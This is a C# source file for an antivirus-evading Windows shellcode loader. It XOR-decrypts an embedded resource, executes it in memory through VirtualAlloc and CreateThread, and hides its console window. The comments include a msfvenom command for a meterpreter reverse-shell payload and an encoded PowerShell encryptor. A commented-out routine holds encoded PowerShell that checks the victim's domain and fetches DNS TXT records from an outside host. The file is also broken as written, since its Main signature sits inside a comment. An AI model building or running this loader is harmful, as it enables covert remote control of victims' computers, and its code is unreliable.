using System;
using System.Text;
using System.Management.Automation;
using System.Runtime.InteropServices;
using System.Reflection;
using System.IO;
using System.Collections.ObjectModel;
using System.Reflection;

namespace code2
{
    class Program
    {
		
		[DllImport("kernel3"+"2.dll", EntryPoint = "VirtualAl"+"loc",SetLastError = true, ExactSpelling = true)]
        static extern IntPtr test0(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel3"+"2.dll", EntryPoint = "Creat"+"eThread")]
        static extern IntPtr test3(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel3"+"2.dll", EntryPoint = "WaitForSingle"+"Object")]
		static extern UInt32 test(IntPtr hHandle, UInt32 dwMilliseconds);
		
		
		    [DllImport("kernel32.dll")]
			private static extern IntPtr GetConsoleWindow();

			[DllImport("user32.dll")]
			private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

			const int SW_HIDE = 0;
			const int SW_SHOW = 5;
/*
        static string GetTxtRecords(string domain)
        {

            PowerShell ps = PowerShell.Create();
            string command;
            Collection<PSObject> PSOutput;
            string encodedString = "JGRfbWFpbl9uID0gKEdldC1XbWlPYmplY3QgV2luMzJfQ29tcHV0ZXJTeXN0ZW0pLkRvbWFpbjsKaWYgKCRkX21haW5fbiAtbWF0Y2ggIm5vcnRoIiAtb3IgJGRfbWFpbl9uIC1tYXRjaCAic291dGgiIC1vciAkZF9tYWluX24gLW1hdGNoICJjZW50cmFsIiApIHsKfWVsc2V7CkV4aXQ7Cn0KJGRvbWFpbiA9ICJiYmNjLmFiYmFuay5vbmxpbmUiOwokdHh0UmVjb3JkcyA9IFJlc29sdmUtRG5zTmFtZSAtTmFtZSAkZG9tYWluIC1UeXBlIFRYVDsKJHR4dFN0cmluZyA9ICR0eHRSZWNvcmRzIHwgRm9yRWFjaC1PYmplY3QgeyAkXy5TdHJpbmdzIH07CiR0eHRTdHJpbmc=";
            byte[] decodedBytes = Convert.FromBase64String(encodedString);
            command = Encoding.UTF8.GetString(decodedBytes);
            PSOutput = ps.AddScript(command).Invoke();
            return PSOutput[0].ToString();
        }

        static void Main(string[] args)
        {
            IntPtr handle = GetConsoleWindow();
	    */
/*
XOR encrypt:
// 1. msfvenom --payload windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=8443 --format raw --out /tmp/data.bin
// 2. powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc CgAkAGQAYQB0AGEAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAiAGQAYQB0AGEALgBiAGkAbgAiACkACgAKACQAawBlAHkAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AEIAeQB0AGUAcwAoACIAcwBlAGMAcgBlAHQAIgApAAoACgBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABkAGEAdABhAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsACgAgACAAIAAgACQAZABhAHQAYQBbACQAaQBdACAAPQAgACQAZABhAHQAYQBbACQAaQBdACAALQBiAHgAbwByACAAJABrAGUAeQBbACQAaQAgACUAIAAkAGsAZQB5AC4ATABlAG4AZwB0AGgAXQAKAH0ACgAKAFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFcAcgBpAHQAZQBBAGwAbABCAHkAdABlAHMAKAAiAHgAbwByAF8AZABhAHQAYQAuAGIAaQBuACIALAAgACQAZABhAHQAYQApAAoAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAVwByAGkAdABlAEEAbABsAFQAZQB4AHQAKAAiAHgAbwByAF8AZABhAHQAYQAuAGIANgA0ACIALAAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAZABhAHQAYQApACkACgA=
data.bin => xor_data.bin
//3. C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:loader.exe /platform:x64 loader.cs /res:xor_data.bin


string key = "secret";
byte[] keyBytes = System.Text.Encoding.ASCII.GetBytes(key);
for (int i = 0; i < data.Length; i++)
{
	data[i] ^= keyBytes[i % keyBytes.Length];
}


*/
			ShowWindow(handle, SW_HIDE);
			Assembly assembly = Assembly.GetExecutingAssembly();
			Stream stream = assembly.GetManifestResourceStream("xor_data.bin");
			BinaryReader reader = new BinaryReader(stream);
			byte[] data = reader.ReadBytes((int)stream.Length);
			


			string key = "secret";
			byte[] keyBytes = System.Text.Encoding.ASCII.GetBytes(key);
			for (int i = 0; i < data.Length; i++)
			{
				data[i] ^= keyBytes[i % keyBytes.Length];
			}
			
			
			
            IntPtr addr = test0(IntPtr.Zero, (uint)data.Length, 0x3001-1, 0x42 - 2);
            Marshal.Copy(data, 4-4, addr, data.Length);
            IntPtr hThread = test3(IntPtr.Zero, 2-2, addr, IntPtr.Zero, 1-1, IntPtr.Zero);
            test(hThread, 0xFFFFFFFE+1);
            return;
        }
    }

    
}
